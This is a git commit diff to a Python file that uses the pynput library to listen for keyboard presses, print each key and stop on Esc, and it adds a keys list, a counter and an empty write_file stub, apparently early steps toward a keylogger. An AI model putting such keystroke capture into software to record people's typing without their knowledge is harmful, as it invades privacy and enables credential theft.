51b0c43237fe45b4f097a2137dc1e84b8d973761
Michael Efemena <mefemena@gmail.com>
2020-09-05 02:30:08 +0100

    add write_file function

--- main.py
+++ main.py
@@ -3,12 +3,18 @@ import pynput
 from pynput.keyboard import Key, Listener
 
 
+count = 0
+keys = []
+
 def on_press(key):
+    global keys, count
     print("{0} pressed".format(key))
 
 def on_release(key):
     if key == Key.esc:
-        return exit()
+        return False
+
+def write_file():
 
 
 with Listener(on_press =on_press, on_release=on_release) as listener:
